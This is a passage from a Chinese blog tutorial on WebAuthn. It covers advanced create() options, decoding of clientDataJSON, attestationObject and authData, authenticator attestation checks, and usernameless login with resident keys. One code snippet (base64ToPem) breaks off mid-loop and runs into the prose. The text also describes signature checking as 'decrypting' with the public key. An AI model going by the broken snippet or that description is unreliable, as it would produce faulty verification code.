Firefox，很遗憾目前我还没有找到对应的开发工具或是浏览器扩展可用。</p>\n<p>如果你希望了解更多关于非对称加密的数学证明，可以查阅阮一峰老师的<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">这篇文章</a>。</p>\n<p>如果你希望了解更多关于 Credential Management API 的信息，可以查阅<a href=\"https://medium.com/dev-channel/sign-in-on-the-web-credential-management-api-and-best-practices-d21aed14b6fe\">这篇文章</a>（英文）。</p>\n<p>如果你希望了解更多 WebAuthn 的细节，可以继续往下阅读。<span></span></p>\n<h1>深入了解 WebAuthn</h1>\n<p>如上文所说，如果摆脱对第三方库的依赖，或是要实现更安全的 WebAuthn，我们必须深入了解 WebAuthn。在这一部分中，我们会详细讨论上文没有提到的一些概念和参数，并了解 WebAuthn 中各类数据的结构以实现解码与验证。先来看一看一些进阶的选项吧。</p>\n<h2>进阶选项</h2>\n<p>没错，上文提到的传入 <code>navigator.credentials.create()</code> 和 <code>navigator.credentials.get()</code> 方法的参数其实只是所有参数的一部分。对于 <code>create()</code>，我们还可以配置这些可选内容（上文提及的已省略）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        rp: {\r\n            icon\r\n        },\r\n        user: {\r\n            icon\r\n        },\r\n        attestation,\r\n        authenticatorSelection: {\r\n            requireResidentKey\r\n        },\r\n        extensions\r\n    }\r\n})</pre>\n</pre>\n<ul>\n<li>\n<code>rp.icon: String</code> 和 <code>user.icon</code>：是的，你可以为依赖方和用户设置图标，可以使用 HTTPS URL 或 Base64，一般长度不能超过 128 字节，不过大部分浏览器不会显示图标，或是有非常小的图片体积限制，所以一般没有使用这一属性的必要</li>\n<li>\n<code>attestation: String</code>：表明依赖方是否需要证明。可选三个值：\n<ul>\n<li>\n<code>none</code>：（默认）不需要证明。如上文所述，依赖方不关心证明，因此认证器不会签名。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n<li>\n<code>indirect</code>：依赖方需要证明，但证明方式可由认证器选择。在支持匿名证明的认证器上，认证器会通过匿名证明的方式签名挑战，并向依赖方提供签名方式等信息</li>\n<li>\n<code>direct</code>：依赖方要求直接证明。此时认证器会使用烧录在认证器中的公钥进行签名，同时向依赖方提供签名方式等信息以供依赖方验证认证器是否可信。更多信息可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节</li>\n</ul>\n</li>\n<li>在 <code>authenticatorSelection</code> 中，我们还可以设置两个可选属性：\n<ul>\n<li>\n<code>authenticatorSelection.requireResidentKey: Boolean</code>：是否要求将私钥钥永久存储于认证器中。默认值为 <code>false</code>。对于 iOS/iPad OS 13，必须设置为 <code>false</code>，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n<li>\n<code>extensions: Object</code>：WebAuthn 扩展，可以提供规范之外的配置和响应。由于实际情况中很少会使用这一特性，我们不会在这篇文章中讨论它</li>\n\n<blockquote><p>将 <code>requireResidentKey</code> 设置为 <code>true</code> 可以实现无用户名的登录，即认证器同时替代了用户名和密码。需要注意的是，尽管大部分认证器可以实现无限对公私钥，<strong>但能永久存储的私钥数量是有限的</strong>（对于 Yubikey，这通常是 25），因此只应在真正需要的时候启用此特性。我们会在“<a href=\"https://flyhigher.top/#login-without-username\">无用户名登录</a>”一节中详细讨论原因。</p></blockquote>\n<blockquote><p><strong>如果你没有高安全需求（如银行交易等），请不要向认证器索取证明</strong>，即将 <code>attestation</code> 设置为 \"none\"。对于普通身份认证来说，要求证明不必要的，且会有浏览器提示打扰到用户。</p></blockquote>\n<blockquote><p>Android 暂时无法实施用户验证，进而会导致依赖方验证失败。你可以在<a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=997538\">这里</a>追踪这个特性的实现情况。</p></blockquote>\n<blockquote>\n<p>对于 <code>extensions</code>，由于目前浏览器支持和应用范围有限，我们不会在这篇文章中涉及，不过你可以看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    uvm: true, // 要求认证器返回用户进行验证的方法\r\n    txAuthSimple: \"Please proceed\" // 在认证器上显示与交易有关的简短消息\r\n}</pre>\n<p>你可以在<a href=\"https://www.w3.org/2019/01/webauthn-extensions.html\">这个页面</a>了解更多关于 <code>extensions</code> 的信息。</p>\n</blockquote>\n<p>对于 <code>get()</code>，我们其实只有一个可选内容没讲了，即 <code>extensions</code>。和上文一样，我们不会在这篇文章中讨论它。</p>\n<p>就这些了！<span></span></p>\n<h2>手动解个码</h2>\n<p>是时候看看如何手动解码了。我们将会在这一节中讨论认证器返回的数据的结构以及如何正确地解码它们。</p>\n<p>首先我们来看看如何处理注册过程中认证器发回的数据。假设所有 <code>ArrayBuffer</code> 类型的值都被正确地以 Base64 编码，且后端已经将 JSON 的字符串解析为字典。先来复习一下，我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"ZRBkDBCEtq...9XY8atOcbg\",\r\n    type: \"public-key\",\r\n    rawId: \"ZRBkDBCEtq...9XY8atOcbg==\",\r\n    response: {\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...i5jcmVhdGUifQ==\",\r\n        attestationObject: \"o2NmbXRkbm9uZWd...xNHuAMzz2LxZA==\"\r\n    }\r\n}</pre>\n<p>这里的 <code>id</code> 就是凭证的 ID，如果验证正确，我们最终要将它存储起来并于用户关联。同时可以看到 Base64 编码后的 <code>rawId</code> 其实和 <code>id</code> 是一致的（不过 <code>id</code> 是 Base64URL 编码的）。而 <code>type</code> 则一定是 \"public-key\"。</p>\n<p>不过，我们主要关心的还是 <code>respose</code> 中的两项内容。首先是 <code>clientDataJSON</code>。它的处理比较简单，看名字就知道，它应该是一个 JSON 字符串。</p>\n<blockquote><p>小技巧：如果你看到一个 Base64 编码的字符串以 \"ey\" 开头，那么它大概率是一个 Base64 编码的 JSON。</p></blockquote>\n<p>将<code>clientDataJSON</code> Base64 解码再 JSON 解码之后我们就能得到一个字典：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"NI4i1vsNmP2KHcmyFnBCKRVQPfHgg34SsYZUOPZY2lM\",\r\n    extra_keys_may_be_added_here: \"do not compare clientDataJSON against a template. See https://goo.gl/yabPex\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>结构一目了然。在这里，我们需要验证三项内容：</p>\n<ul>\n<li>\n<code>challenge</code> 和之前发送的一致</li>\n<li>\n<code>origin</code> 为创建凭证的页面的源（协议+主机名+端口号，并非 URL）</li>\n<li>\n<code>type</code> 为 \"webauthn.create\"</li>\n</ul>\n<p>同时可以注意到有一个奇怪的 <code>extra_keys_may_be_added_here</code>。这其实是 Google 在 Chrome 中搞的一点小把戏，有一定概率会出现，提醒我们需要将 JSON 解析后再验证键值以防额外插入的键值影响验证。具体信息你可以访问那个 URL 看一看。</p>\n<p>对于 Firefox，我们会多得到两项 <code>clientExtensions</code> 和 <code>hashAlgorithm</code> ，分别指明了客户端扩展数据和签名算法。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"3-4\">{\r\n    challenge: \"dg6ost6ujhAA0g6WqLe-SOOH-tbhvjW9Sp90aPKlLJI\",\r\n    clientExtensions: {},\r\n    hashAlgorithm: \"SHA-256\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.create\"\r\n}</pre>\n<p>由于本文不考虑扩展数据，因此我们可以不考虑 <code>clientExtensions</code>。同时由于目前规范中指定的签名算法只有 SHA-256 一种，因此现阶段我们也可以简单地忽略 <code>hashAlgorithm</code>。</p>\n<p><code>clientDataJSON</code> 很简单地就处理完了。接下来我们要来看看 <code>attestationObject</code>。先来看看 <code>attestationObject</code> 的结构图示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s1-3.png\" alt=\"attestationObject 的结构\" width=\"1056\" height=\"532\" class=\"aligncenter size-full wp-image-2245\"></a>\n<p><code>attestationObject</code> 是 CBOR 编码后再被 Base64 编码的，因此我们需要额外对其进行 CBOR 解码。</p>\n<blockquote><p>CBOR (Concise Binary Object Representation, 简明二进制对象表示) 是一种多应用于物联网领域的编码方式，你可以将它看作体积更小、更方便物联网传输的二进制 JSON。大部分语言都可以找到对应的 CBOR 解码库。</p></blockquote>\n<p>我们当然不会手解 CBOR，直接来看看解开之后的样子吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"none\",\r\n    attStmt: {},\r\n    authData: [211, 217, 43, 24, 199, ..., 97, 238, 166, 67, 107]\r\n}</pre>\n<p>这些键值的含义如下：</p>\n<ul>\n<li>\n<code>fmt</code>：标明证明的格式。WebAuthn 预定义了几种格式，分别为：\n<ul>\n<li>\n<code>none</code>：没有证明</li>\n<li>\n<code>packed</code>：为 WebAuthn 优化的证明格式</li>\n<li>\n<code>android-safetynet</code>：Android 使用的格式</li>\n<li>\n<code>android-key</code>：又是 Android 使用的格式</li>\n<li>\n<code>fido-u2f</code>：FIDO U2F 认证器使用的格式</li>\n<li>\n<code>tpm</code>：TPM 可信平台模块使用的格式</li>\n</ul>\n</li>\n<li>\n<code>attStmt</code>：证明对象，具体格式根据 <code>fmt</code> 的不同会有所不同</li>\n<li>\n<code>authData</code>：包含公钥、签名计数等来自认证器的数据</li>\n</ul>\n<p>诶，例子里的 <code>attStmt</code> 怎么是空的？还记得之前说的吗？大部分情况下，<strong>如果依赖方不要求证明，那么认证器不会签名挑战</strong>，于是 <code>fmt</code> 会变为 \"none\"，<code>attstmt</code> 会为空。如果不是高安全要求，我们可以只对这一种情况做支持。</p>\n<blockquote><p>注意，部分情况下 Firefox 会在不要求证明（即 <code>attestation</code> 为 \"none\"）时会返回 <code>fmt</code> 为 \"packed\" 的证明。<strong>这是符合规范的。</strong>此时认证器会进行自证明，你可以视情况进行处理。具体可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>对于非 \"none\" 的 <code>fmt</code> 我们稍后再谈，现在我们先来看看 <code>authData</code>。来复习一下 <code>authData</code> 的结构：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s2-3.png\" alt=\"authData 的结构\" width=\"1056\" height=\"384\" class=\"aligncenter size-full wp-image-2240\"></a>\n<p>对于它的解码比较简单粗暴，我们要做的就是根据图示将它切开，然后适当地转换类型。其中各部分的含义如下：</p>\n<ul>\n<li>\n<code>rpIdHash</code>：如其名，SHA-256 的 <code>rpId</code>，长度 32 字节</li>\n<li>\n<code>flags</code>：标识认证状态，长度 1 字节。其中 8 位分别为：\n<ul>\n<li>\n<code>ED</code>：是否有扩展数据</li>\n<li>\n<code>AT</code>：是否包含 <code>attestedCredentialData</code>。通常注册认证器时会包含 <code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\" 